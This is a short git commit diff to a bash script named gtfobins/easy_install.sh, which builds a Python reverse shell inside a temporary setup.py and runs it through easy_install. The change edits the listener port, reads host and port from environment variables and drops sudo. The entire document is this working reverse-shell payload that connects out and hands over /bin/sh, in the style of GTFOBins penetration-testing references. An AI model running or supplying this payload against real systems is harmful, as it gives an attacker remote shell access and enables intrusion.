f8bf5f3f92e92e9b8c4de05757f768d705912699
montysecurity <jacobcainmontgomery@gmail.com>
2020-10-03 01:02:34 -0500

    change

--- gtfobins/easy_install.sh
+++ gtfobins/easy_install.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 
 export RHOST=0.0.0.0
-export RPORT=5253
+export RPORT=12345
 TF=$(mktemp -d)
 echo 'import sys,socket,os,pty;s=socket.socket()
-s.connect(("'$RHOST'",int('$RPORT')))
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
 pty.spawn("/bin/sh")' > $TF/setup.py
-sudo easy_install $TF
+easy_install $TF
